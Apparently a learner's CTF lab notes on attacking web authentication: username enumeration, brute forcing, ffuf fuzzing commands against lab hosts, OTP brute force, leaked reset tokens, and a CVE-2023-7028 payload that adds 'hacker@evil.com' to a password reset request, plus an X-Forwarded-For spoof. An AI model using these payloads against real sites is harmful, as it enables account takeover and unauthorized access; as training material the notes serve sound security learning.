____

# Weak Passwords

![[Pasted image 20241217114441.png]]

# Default Passwords

Search for "Default credentials" on google

# Username enumeration through errors

Username is invalid

![[Pasted image 20241217120440.png]]
# Username Enumeration Through Forgot Password Function

Invalid username supplied

![[Pasted image 20241217122422.png]]

# Brute Forcing Username and Password

Cluster-bomb

# Self Registration Using Content Discovery

```bash
ffuf -u https://vdooaly3.eu1.ctfio.com/hidden-registration/user_FUZZ -w content.txt
```

![[Pasted image 20241217123723.png]]

## Javascript Files

![[Pasted image 20241217123935.png]]

## APIs

Leaked ``/by-api/api/auth/login/``

![[Pasted image 20241217124748.png]]

# Brute Forcing One-Time Password (OTP)

![[Pasted image 20241217125652.png]]

# Leaked Password Reset Tokens
## 1
![[Pasted image 20241217131421.png]]

```bash
ffuf -u https://vdooaly3.eu1.ctfio.com/reset-token-leak/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

![[Pasted image 20241217131733.png]]

![[Pasted image 20241217131757.png]]

![[Pasted image 20241217131922.png]]

## 2

```bash
ffuf -u https://vdooaly3.eu1.ctfio.com/api-token-leak/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

![[Pasted image 20241217133540.png]]

# Forced Password Reset

Add email field, 
![[Pasted image 20241217134424.png]]

https://github.com/Vozec/CVE-2023-7028


```
user[email][]=my.target@example.com&user[email][]=hacker@evil.com
```

# Bypassing API Authentication with X-Forwarded-For

![[Pasted image 20241217134850.png]]


```
X-forwarded-for: 127.0.0.1
```

![[Pasted image 20241217135113.png]]
# X-Forwarded-For with Information Disclosure

```bash
curl -I https://mzg7ibfb.eu1.ctfio.com/by-api-xip-2/admin/
```

![[Pasted image 20241217135449.png]]

